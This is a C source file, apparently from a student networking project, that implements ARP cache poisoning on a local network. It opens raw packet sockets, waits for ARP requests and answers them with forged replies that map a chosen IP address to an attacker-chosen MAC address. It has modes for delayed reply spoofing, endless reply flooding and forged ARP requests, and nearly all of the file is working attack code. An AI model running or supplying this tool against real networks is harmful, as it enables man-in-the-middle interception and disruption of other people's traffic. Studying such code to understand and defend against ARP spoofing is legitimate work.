#define _GNU_SOURCE     /* To get defns of NI_MAXSERV and NI_MAXHOST */
#include "ft_malcom.h"
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/if_link.h>
#include <net/if.h>

// This function can be used for both IPv4 and IPv6 addresses.
// Both addresses (*ip1 and *ip2) must be of same family.
bool	in_same_network(uint8_t *ip1, uint8_t *ip2, uint8_t *mask, int len) {

	for (int i = 0; i < len; i++) {
		if ((ip1[i] & mask[i]) != (ip2[i] & mask[i]))
			return (false);
	}
	return (true);
}

int	get_interace_index(struct ifaddrs *ifaddr, struct ifaddrs *ifa) {

	struct ifaddrs	*ifa2;

	for (ifa2 = ifaddr; ifa2 != NULL; ifa2 = ifa2->ifa_next) {

		if (ifa2->ifa_addr == NULL)
			continue;

		if (!strcmp(ifa->ifa_name, ifa2->ifa_name) && ifa2->ifa_addr->sa_family == AF_PACKET) {

			printf("Found available interface:  %s\n", ifa->ifa_name);

			unsigned int index = if_nametoindex(ifa->ifa_name);
			if (index == 0) {
				perror("if_nametoindex");
				return (-1);
			}

			// Debug
			// printf("Interface index: %u\n", index);

			return (index);
		}
	}

	fprintf(stderr, "Interface %s does not have a AF_PACKET address\n", ifa->ifa_name);
	return (-1);
}

int	find_interface()
{
	struct ifaddrs *ifaddr, *ifa;

	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs");
		return (-1);
	}

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {

		// We are only interested in AF_INET interfaces with a valid netmask, since we need to check if the source and target IPs belong to the same network as the interface.
		// Then we will check if there is an interface with the same name and with an AF_PACKET address, which is required to send raw packets.
		if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET ||ifa->ifa_addr == NULL || ifa->ifa_netmask == NULL)
			continue;

		// Check if the source and target ips belong to this interface.

		uint8_t if_ip[IPV4_ADDR_LEN], if_mask[IPV4_ADDR_LEN], src_ip[IPV4_ADDR_LEN], tar_ip[IPV4_ADDR_LEN];

		memcpy(&if_ip, (void *)&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr, sizeof(if_ip));
		memcpy(&if_mask, (void *)&((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr, sizeof(if_mask));
		memcpy(&src_ip, args.src_ip, sizeof(src_ip));
		memcpy(&tar_ip, args.tar_ip, sizeof(tar_ip));

		if (!in_same_network(if_ip, src_ip, if_mask, IPV4_ADDR_LEN) || !in_same_network(if_ip, tar_ip, if_mask, IPV4_ADDR_LEN))
			continue;

		printf("Source IP belongs to interface: %s\n", ifa->ifa_name);
		printf("Target IP belongs to interface: %s\n", ifa->ifa_name);

		int interface_index = get_interace_index(ifaddr, ifa);

		if (interface_index < 0)
			goto interface_error;

		freeifaddrs(ifaddr);
		return (interface_index);
	}

interface_error:
	fprintf(stderr, "No interface found for the given source and target IPs\n");
	freeifaddrs(ifaddr);
	return (-1);
}

/* #################################################################### */

void	craft_arp_reply(t_ArpPacket *request, t_ArpPacket *reply) {
	// Layer 2 (Ethernet)
	memcpy(reply->dest, args.tar_mac, ETHER_ADDR_LEN);
	memcpy(reply->sender, args.src_mac, ETHER_ADDR_LEN);
	reply->ether_type = htons(ETHERTYPE_ARP);

	// Layer 3 (ARP)
	reply->hrd = htons(1); // Ethernet
	reply->pro = htons(ETHERTYPE_IP);	// IPv4
	reply->hln = ETHER_ADDR_LEN; 		// MAC address length
	reply->pln = IPV4_ADDR_LEN;			// IP address length
	reply->op = htons(ARES_OP_REPLY); 	// ARP reply operation code.

	memcpy(reply->sha, args.src_mac, reply->hln);
	memcpy(reply->spa, args.src_ip, reply->pln);

	memcpy(reply->tha, args.tar_mac, reply->hln);
	memcpy(reply->tpa, args.tar_ip, reply->pln);
}

int	handle_request(char *buff, int packet_socket, int interface_index) {

	t_ArpPacket			request, reply;
	struct sockaddr_ll	addr;

	bzero(&request, sizeof(request));
	bzero(&reply, sizeof(reply));
	bzero(&addr, sizeof(addr));

	if (parse_request(buff, &request) != 0) {
		fprintf(stderr, "Failed to parse ARP request\n");
		return (1);
	}
	show_request_info(&request);
	craft_arp_reply(&request, &reply);

	addr.sll_family = AF_PACKET;
	addr.sll_protocol = htons(ETH_P_ARP);
	addr.sll_ifindex = interface_index;
	addr.sll_halen = reply.hln;
	memcpy(addr.sll_addr, reply.dest, ETHER_ADDR_LEN);

	// Sleep for a short time to let the legitimate ARP reply arive before our spoofed unsolicited reply.
	// This will only work if the target system accepts unsolicited ARP replies.
	if (args.attack_type == REPLY_SPOOFING)
		sleep(2);

	while (1) {
		if (sendto(packet_socket, &reply, sizeof(reply), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
			puts( strerror( errno ) );
			return (1);
		}
		printf("Sent an ARP reply to the target...\n");

		if (args.attack_type != REPLY_FLOODING)
			break ;

		sleep(1);
	}

	return (0);
}

int	arp_reply_spoof(int interface_index) {

	int					packet_socket, recvd;
	char				buff[ETH_ZLEN];
	uint16_t			opcode;
	struct	sockaddr_ll	src_addr;
	socklen_t			src_addr_len = sizeof(src_addr);

	bzero(&src_addr, sizeof(src_addr));

	// Create a packet socket.
	packet_socket = socket (AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (packet_socket < 0) {
		puts( strerror( errno ) );
		return (-1);
	}

	// Listen for ARP requests and process the first one we receive.
	while (1) {
		bzero(buff, sizeof(buff));
		recvd = recvfrom(packet_socket, buff, sizeof(buff), 0, (struct sockaddr *)&src_addr, &src_addr_len);
		if (recvd < 0) {
			puts( strerror( errno ) );
			close(packet_socket);
			return (-1);
		} 

		// 64 bytes is the minimum size of a packet fixed by ethernet standard.
		// 4 bytes (FCS / CRC) are not captured by the socket, so we expect to receive 60 bytes.
	
		if (src_addr.sll_ifindex != interface_index || recvd != ETH_ZLEN) // TODO : does it have to come from the same interface ?
			continue;

		memcpy(&opcode, buff + ARP_OPCODE_OFFSET, sizeof(uint16_t));
		if (ntohs(opcode) == ARES_OP_REQUEST) {
			printf("Received an ARP request, processing it...\n");
			break ;
		}
	}

	if (handle_request(buff, packet_socket, interface_index) != 0) {
		fprintf(stderr, "Failed to handle ARP request\n");
		close(packet_socket);
		return (-1);
	}

	close(packet_socket);
	return (0);
}


void	craft_arp_request(t_ArpPacket *request) {
	// Layer 2 (Ethernet)
	memcpy(request->dest, args.tar_mac, ETHER_ADDR_LEN);
	memcpy(request->sender, args.src_mac, ETHER_ADDR_LEN);
	request->ether_type = htons(ETHERTYPE_ARP);

	// Layer 3 (ARP)
	request->hrd = htons(1); // Ethernet
	request->pro = htons(ETHERTYPE_IP);		// IPv4
	request->hln = ETHER_ADDR_LEN; 			// MAC address length
	request->pln = IPV4_ADDR_LEN;			// IP address length
	request->op = htons(ARES_OP_REQUEST);	// ARP request operation code.

	memcpy(request->sha, args.src_mac, request->hln);
	memcpy(request->spa, args.src_ip, request->pln);

	memcpy(request->tha, args.tar_mac, request->hln);
	memcpy(request->tpa, args.tar_ip, request->pln);
}

int		arp_request_spoof(int interface_index) {
	int					packet_socket;
	struct sockaddr_ll	addr;
	t_ArpPacket			request;

	bzero(&addr, sizeof(addr));
	bzero(&request, sizeof(request));

	// Create a packet socket.
	packet_socket = socket (AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (packet_socket < 0) {
		puts( strerror( errno ) );
		return (-1);
	}

	craft_arp_request(&request);

	addr.sll_family = AF_PACKET;
	addr.sll_protocol = htons(ETH_P_ARP);
	addr.sll_ifindex = interface_index;
	addr.sll_halen = request.hln;
	memcpy(addr.sll_addr, request.dest, ETHER_ADDR_LEN);

	printf("Sending an ARP request to the target...\n");

	if (sendto(packet_socket, &request, sizeof(request), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		puts( strerror( errno ) );
		close(packet_socket);
		return (3);
	}

	close(packet_socket);
	return (0);
}
